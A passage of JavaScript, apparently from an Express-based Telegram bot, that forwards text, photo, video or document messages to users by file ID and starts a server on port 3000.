            // Forward any type of message or content
            if (content.text) {
                bot.sendMessage(user, content.text);
            } else if (content.photo) {
                const photoId = content.photo[0].file_id;
                bot.sendPhoto(user, photoId);
            } else if (content.video) {
                const videoId = content.video.file_id;
                bot.sendVideo(user, videoId);
            } else if (content.document) {
                const documentId = content.document.file_id;
                bot.sendDocument(user, documentId);
            }
        }
    });
    return numberOfUsers;
}

app.listen(3000, () => console.log("App Running on Port 3000!"));
 
